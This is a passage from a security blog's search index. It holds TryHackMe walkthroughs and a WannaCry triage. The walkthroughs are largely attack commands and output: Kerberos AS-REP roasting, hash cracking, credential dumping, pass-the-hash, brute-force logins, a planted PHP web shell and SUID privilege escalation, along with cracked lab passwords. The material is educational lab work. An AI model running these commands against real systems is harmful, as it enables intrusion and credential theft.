userlist.txt --dc 10.10.101.26 -d spookysec.local\t2022/09/27 19:05:34 &gt; [+] VALID USERNAME: james@spookysec.local\t2022/09/27 19:05:36 &gt; [+] VALID USERNAME: svc-admin@spookysec.local\t2022/09/27 19:05:39 &gt; [+] VALID USERNAME: James@spookysec.local\t2022/09/27 19:05:40 &gt; [+] VALID USERNAME: robin@spookysec.local\t2022/09/27 19:05:47 &gt; [+] VALID USERNAME: darkstar@spookysec.local\t2022/09/27 19:05:52 &gt; [+] VALID USERNAME: administrator@spookysec.local\t2022/09/27 19:06:03 &gt; [+] VALID USERNAME: backup@spookysec.local\t2022/09/27 19:06:09 &gt; [+] VALID USERNAME: paradox@spookysec.local\t2022/09/27 19:06:40 &gt; [+] VALID USERNAME: JAMES@spookysec.local\t2022/09/27 19:06:53 &gt; [+] VALID USERNAME: Robin@spookysec.local\t2022/09/27 19:08:06 &gt; [+] VALID USERNAME: Administrator@spookysec.local\t2022/09/27 19:10:45 &gt; [+] VALID USERNAME: Darkstar@spookysec.local\t2022/09/27 19:11:37 &gt; [+] VALID USERNAME: Paradox@spookysec.localFingerprintAs we don’t have creds for any user we can try pulling Kerberos’ ticket with GetNPUsers.py:zero@pio$ GetNPUsers.py spookysec.local/svc-admin -no-passWith the ticket now we can try bruteforcing it to cracked:zero@pio$ hashcat -m 18200 hash ../exploits/wordlist/passwordlist.txt\t$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a26846e0ac0550f4789ecda3c3164d04$fc3576ca02e7fe09ade53f6aebff2ebcb18e49fe0b9385f20e1c66612c3cb76d2fc68a9813852a3f7b513723af6eac8f6d2a705f2a4df9adedacff12fff8a305108790df779da1ea77837a8159d3434651384db2aefc89ba4b590400b32034d2d0049e1f2a56c80025a4ca6e86accbdca801ebb7428593cf2be30728a427eaa364d0d2a6c051d19d261b72a0f075d6cf38e6c2e6fc38be91826a88c9dd07a99f891e3c4de93c22b605b957af71ba2958849b16c70b4543274363653b6f1621aca8365fd6e5043790958c4aa034fffa6e2c1dbff35274351fe91eba7375968b4361dbd97ee8df36e835d4dbcd126dcd3dc9b1:management2005 \tSession..........: hashcat\tStatus...........: CrackedWe can use these creds to list the smb:zero@pio$ smbclient -L \\\\\\\\10.10.51.28\\\\ -U spookysec.local/svc-admin \tPassword for [SPOOKYSEC.LOCAL\\svc-admin]:\t\t Sharename Type Comment\t --------- ---- -------\t ADMIN$ Disk Remote Admin\t backup Disk \t C$ Disk Default share\t IPC$ IPC Remote IPC\t NETLOGON Disk Logon server share \t SYSVOL Disk Logon server shareWe found an interesting share, backup. From there we can get a file:zero@pio$ smbclient \\\\\\\\10.10.51.28\\\\backup -U spookysec.local/svc-admin\tPassword for [SPOOKYSEC.LOCAL\\svc-admin]:\tTry \"help\" to get a list of possible commands.\tsmb: \\&gt; ls\t . D 0 Sat Apr 4 20:08:39 2020\t .. D 0 Sat Apr 4 20:08:39 2020\t backup_credentials.txt A 48 Sat Apr 4 20:08:53 2020\t\t 8247551 blocks of size 4096. 3577282 blocks available\tsmb: \\&gt; get backup_credentials.txt \tgetting file \\backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)We found there the string YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw. We can decode it from base64:zero@pio$ echo \"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw\" | base64 -d\tbackup@spookysec.local:backup2517860Now we can dump all the hashes with these creds:zero@pio$ secretsdump.py -just-dc backup@spookysec.local\tAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::We can use that hash to get the administrator shell:zero@pio$ evil-winrm -i 10.10.51.28 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc\t*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;" }, { "title": "TryHackMe | RootMe", "url": "/pentesting/tryhackme/rootme", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-26 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: HackIT - Home| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe some some CVE assigned to that Apache version. Fuzzing the web we found:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.179.194/FUZZ'\tcss [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 112ms]\tjs [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 284ms]\tuploads [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 111ms]\tpanel [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 106ms]\tserver-status [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 103ms]\t [Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 105msInside of /uplaods/ we found a empty directory. In /panel/ we can see that we can upload some files. Let’s try with the default pentestmonkey reverse shell.FingerprintUpload the shell to the target and we got the following error:Let’s try finding what type of file accepts. Uploading shell.php3 allow us. Now we can see the file in the /uploads/ path. Start a netcat and connect to it. We first see that our file didn’t executed.Trying with shell.phar will work.Privilege EscalationWe will search for SUID, finding one particular binary:bash-4.4$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null\t-rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/pythonWe will use GTFObins to get the explotation:$ /usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'whoami\troot" }, { "title": "TryHackMe | Mr Robot CTF", "url": "/pentesting/tryhackme/mr-robot-ctf", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-25 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION22/tcp closed ssh80/tcp closed http443/tcp closed httpsThe nmap doesn’t tell us which OS is. With ping we can see the ttl:zero@pio$ ping 10.10.3.202 \tPING 10.10.3.202 (10.10.3.202) 56(84) bytes of data.\t64 bytes from 10.10.3.202: icmp_seq=1 ttl=63 time=74.9 msWith the ttl=63 we can probably is Linux. Both webpages show the same, a copy of the Mr Robot show. We can see that the page ends with a terminal prompt. We can see a bunch of aviable commands:preparefsocietyinformquestionwakeupjoinWe found some webpages with some commands, like /fsociety, /inform, /question, /wakeup and /join. In the last one, the page ask for an email.If we fuzz by directories:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.3.202/FUZZ'\tadmin [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 62ms]\timages [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 63ms]\tjs [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 63ms]\twp-content [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 61ms]\tcss [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 59ms]\twp-admin [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 60ms]\twp-includes [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 61ms]\tblog [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 49ms]\txmlrpc [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1402ms]\tlogin [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1444ms]\tfeed [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 775ms]\trss [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 787ms]\tvideo [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 62ms]\tsitemap [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 49ms]\timage [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 705ms]\taudio [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms]\tphpmyadmin [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 314ms]\tdashboard [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 689ms]\twp-login [Status: 200, Size: 2606, Words: 115, Lines: 53, Duration: 2060ms]We see that is a wordpress. The login page redirect to the /wp-login.php. We can also found the /robots.txt, where we have the first flag:User-agent: *fsocity.dickey-1-of-3.txtThe /fsocity.dic page will download the file, a passlist. Let’s try finding some valid username and using the wordlist. First we start with:zero@pio$ curl http://10.10.3.202/wp-json/wp/v2/users | jqBut we got to a non existent page.FingerprintWe see that the page http://10.10.99.194/xmlrpc.php it is up. We can try enumerating user through it , without succes.zero@pio$ wpscan --url 'http://10.10.3.202/' --enumerate uzero@pio$ sudo wpscan --password-attack xmlrpc -t 20 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P fsocity.dic --url 'http://10.10.3.202/'We can try some names until we found Elliot. Now we can use hydra:zero@pio$ hydra -l Elliot -P fsocity.dic 10.10.3.202 -s 80 http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=&lt;div id=\"login_error\"&gt;' -t 30\t[80][http-post-form] host: 10.10.3.202 login: Elliot password: ER28-0652Now that we are login we can do the classical reverse shell in the Wordpress themes. We will edit the http://10.10.3.202/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyfifteen file to create a reverse shell. We will add system($_GET['cmd']); at the beginning of the file. Now we can test it:zero@pio$ curl -X GET 'http://10.10.3.202/wp-content/themes/twentyfifteen/404.php?cmd=id'\tuid=1(daemon) gid=1(daemon) groups=1(daemon)We cannot get a reverse shell from there so we will edit http://10.10.3.202/wp-admin/theme-editor.php?file=archive.php&amp;theme=twentyfifteen&amp;scrollto=2967. Copy and paste the pentestmonkey reverse shell and access the system.Privilege EscalationWe found an user in the /home folder. Inside of it, there is a md5 password:$ cd /home/ $ ls\trobot$ cd robot$ ls\tkey-2-of-3.txt\tpassword.raw-md5$ cat key-2-of-3.txt\tcat: key-2-of-3.txt: Permission denied$ cat password.raw-md5\trobot:c3fcd3d76192e4007dfb496cca67e13bWith john we can crack it easily:zero@pio$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash \tCreated directory: /home/zeropio/.john\tUsing default input encoding: UTF-8\tLoaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])\tPress 'q' or Ctrl-C to abort, almost any other key for status\tabcdefghijklmnopqrstuvwxyz (?)We cannot use commands like su or sudo. We need to upgrade the shell and login:$ su robot\tsu: must be run from a terminal$ python -c 'import pty; pty.spawn(\"/bin/bash\")'daemon@linux:/home/robot$ su robot\tsu robot\tPassword: abcdefghijklmnopqrstuvwxyzrobot@linux:~$We can search for SUID permissions:robot@linux:~$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null\t-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping\t-rwsr-xr-x 1 root root 69120 Feb 12 2015 /bin/umount\t-rwsr-xr-x 1 root root 94792 Feb 12 2015 /bin/mount\t-rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6\t-rwsr-xr-x 1 root root 36936 Feb 17 2014 /bin/su\t-rwsr-xr-x 1 root root 47032 Feb 17 2014 /usr/bin/passwd\t-rwsr-xr-x 1 root root 32464 Feb 17 2014 /usr/bin/newgrp\t-rwsr-xr-x 1 root root 41336 Feb 17 2014 /usr/bin/chsh\t-rwsr-xr-x 1 root root 46424 Feb 17 2014 /usr/bin/chfn\t-rwsr-xr-x 1 root root 68152 Feb 17 2014 /usr/bin/gpasswd\t-rwsr-xr-x 1 root root 155008 Mar 12 2015 /usr/bin/sudo\t-rwsr-xr-x 1 root root 504736 Nov 13 2015 /usr/local/bin/nmap\t-rwsr-xr-x 1 root root 440416 May 12 2014 /usr/lib/openssh/ssh-keysign\t-rwsr-xr-x 1 root root 10240 Feb 25 2014 /usr/lib/eject/dmcrypt-get-device\t-r-sr-xr-x 1 root root 9532 Nov 13 2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\t-r-sr-xr-x 1 root root 14320 Nov 13 2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\t-rwsr-xr-x 1 root root 10344 Feb 25 2015 /usr/lib/pt_chownWe found nmap between them. Searching in GTFObins we found a possible explotation:robot@linux:/usr/local/bin$ nmap --interactive\tStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )\tWelcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh # whoami\trootThe last flag is in the /root directory." }, { "title": "TryHackMe | Basic Pentesting", "url": "/pentesting/tryhackme/basic-pentesting", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-24 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)| 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)|_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)In the webserver we found a plain html:We can try fuzzing:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.70.66/FUZZ'\tdevelopment [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 65ms]\tserver-status [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 82ms]\t [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 383ms]There we can see some files talking about the smb. We can try listing it:zero@pio$ smbclient -N -L \\\\\\\\10.10.70.66\\\\ \t Sharename Type Comment\t --------- ---- -------\t Anonymous Disk \t IPC$ IPC IPC Service (Samba Server 4.3.11-Ubuntu)\tReconnecting with SMB1 for workgroup listing.\t\t Server Comment\t --------- -------\t\t Workgroup Master\t --------- -------\t WORKGROUP BASIC2We see an Anonymous folder. We can see it:zero@pio$ smbclient -N \\\\\\\\10.10.70.66\\\\Anonymous\tTry \"help\" to get a list of possible commands.smb: \\&gt; ls\t . D 0 Thu Apr 19 18:31:20 2018\t .. D 0 Thu Apr 19 18:13:06 2018\t staff.txt N 173 Thu Apr 19 18:29:55 2018\t\t 14318640 blocks of size 1024. 11087744 blocks availablesmb: \\&gt; get staff.txtAlso, we can run enum4linux to see that info.FingerprintWe the user now we can try bruteforcing into the ssh:zero@pio$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.70.66/ -t 4\t[22][ssh] host: 10.10.70.66 login: jan password: armandoPrivilege EscalationWe found the other user in the system. There, we can see the .ssh folder:jan@basic2:~$ ls -la ../kay/.ssh\ttotal 20\tdrwxr-xr-x 2 kay kay 4096 Apr 23 2018 .\tdrwxr-xr-x 5 kay kay 4096 Apr 23 2018 ..\t-rw-rw-r-- 1 kay kay 771 Apr 23 2018 authorized_keys\t-rw-r--r-- 1 kay kay 3326 Apr 19 2018 id_rsa\t-rw-r--r-- 1 kay kay 771 Apr 19 2018 id_rsa.pubIf we use the id_rsa we found that we need a passphrase.zero@pio$ ssh kay@10.10.70.66 -i id_rsa\tEnter passphrase for key 'id_rsa':We can use john for this:zero@pio$ ssh2john id_rsa &gt; john_rsazero@pio$ john --wordlist=/usr/share/wordlists/rockyou.txt john_rsaWith it we can now log in in the system as kay." }, { "title": "Index", "url": "/index", "categories": "", "tags": "", "date": "2022-09-16 00:00:00 +0200", "snippet": "Hi! I’m Zeropio. A cybersec student interested in OST (Offensive Security Tools) Development. I like to post some works I have done in this field, from CTFs challenges to malware development.You can found more about me on whoami!Malware Link Description Development Development of malware Triages Triages for different malware samples CTF Like Link Description Reversing Reversing challenges from different sources Labs   Root Me Writeups for Root Me OverTheWire Writeups for OverTheWire XSS Game Writeups for XSS Game XSS Pwnfunction Writeup for XSS Pwnfunction Pentesting LabsThis will be the major theme of this blog. Here we will have: Link Description Pentesting   Hack The Box Here are the machines writeups. I will only upload retired machines TryHackMe THM rooms " }, { "title": "Triage | WannaCry", "url": "/malware/triage/wannacry", "categories": "Malware, Triage", "tags": "malware, windows", "date": "2022-09-10 00:00:00 +0200", "snippet": " Name Sample Link Personal Rating * MD5 Hash WannaCry Github PMAT Husky 6.5 db349b97c37d22f5ea1d1841e3c89eb4 This rating is take from the moment I did this analysis. In the time being, this can change because my skills have progressed. Only take it as a point of view of this moment.StaticHashesFirst, we get the file hashes: MD5 SHA256 db349b97c37d22f5ea1d1841e3c89eb4 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c     A short search on VirusTotal give us that this is a malware by 68/71 security vendors.StringsUsing floss we get some curious strings. Some of them are functions, but also files:mssecsvc.exeKERNEL32.dllMSVCRT.dlllauncher.dlltasksche.exeUSER32.dllADVAPI32.dllSHELL32.dllOLEAUT32.dllWS2_32.dllThis string appear sometimes:__TREEID__PLACEHOLDER____USERID__PLACEHOLDER__@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 have a reference to a computer:SMBrPC NETWORK PROGRAM 1.0LANMAN1.0Windows for Workgroups 3.1aLM1.2X002LANMAN2.1NT LM 0.12A website appear:http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.comSome CopyRight mark:inflate 1.1.3 Copyright 1995-1998 Mark AdlerThe ransomware name appears as well as some file, and file handling instructions:c.wnryWANACRY!CloseHandleDeleteFileWMoveFileExWMoveFileWReadFileWriteFileCreateFileWIt is using some kind of encryption:Microsoft Enhanced RSA and AES Cryptographic ProviderCryptGenKeyCryptDecryptCryptEncryptCryptDestroyKeyCryptImportKeyCryptAcquireContextAcmd.exe /c \"%s\"115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94And changing permissions:icacls . /grant Everyone:F /T /C /QWe found some files with different languages:b.wnryc.wnrymsg/m_bulgarian.wnrymsg/m_chinese (simplified).wnrymsg/m_chinese (traditional).wnrymsg/m_croatian.wnrymsg/m_czech.wnrymsg/m_danish.wnrymsg/m_dutch.wnrymsg/m_english.wnrymsg/m_filipino.wnrymsg/m_finnish.wnrymsg/m_french.wnrymsg/m_german.wnrymsg/m_greek.wnrymsg/m_indonesian.wnrymsg/m_italian.wnrymsg/m_japanese.wnrymsg/m_korean.wnrymsg/m_latvian.wnrymsg/m_norwegian.wnrymsg/m_polish.wnrymsg/m_portuguese.wnrymsg/m_romanian.wnrymsg/m_russian.wnrymsg/m_slovak.wnrymsg/m_spanish.wnrymsg/m_swedish.wnrymsg/m_turkish.wnrymsg/m_vietnamese.wnryr.wnrys.wnryt.wnryu.wnryThere is a clear text XML:&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt; &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=\"asInvoker\" /&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt; &lt;dependency&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /&gt; &lt;/dependentAssembly&gt; &lt;/dependency&gt; &lt;compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"&gt; &lt;application&gt; &lt;!-- Windows 10 --&gt; &lt;supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/&gt; &lt;!-- Windows 8.1 --&gt; &lt;supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/&gt; &lt;!-- Windows Vista --&gt; &lt;supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/&gt; &lt;!-- Windows 7 --&gt; &lt;supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/&gt; &lt;!-- Windows 8 --&gt; &lt;supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/&gt; &lt;/application&gt; &lt;/compatibility&gt;&lt;/assembly&gt;We have a list of files extension, probably the files that this malware handle.PEviewIn PEview we can see that the malware is not apparently packed. We can see the time this malware was compiled, probably this was modified:We can check the difference between the Virtual and Raw Data sizes:There is a difference of 1.078 between both of them, so it may be a packed malware.In the Address Table we can see some weird imports, like URL handling:Or some unknown:CutterHere we can confirm the file hashes and get the architecture, 32 bits:Here we can get the assembly code:0x0040813f nop139: int main (int argc, char **argv, char **envp);; var int32_t var_14h @ esp+0x28; var int32_t var_8h @ esp+0x3c; var int32_t var_41h @ esp+0x75; var int32_t var_45h @ esp+0x79; var int32_t var_49h @ esp+0x7d; var int32_t var_4dh @ esp+0x81; var int32_t var_51h @ esp+0x85; var int32_t var_55h @ esp+0x89; var int32_t var_6bh @ esp+0x8b0x00408140 sub esp, 0x500x00408143 push esi0x00408144 push edi0x00408145 mov ecx, 0xe ; 140x0040814a mov esi, str.http:__www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com ; 0x4313d00x0040814f lea edi, [var_8h]0x00408153 xor eax, eax0x00408155 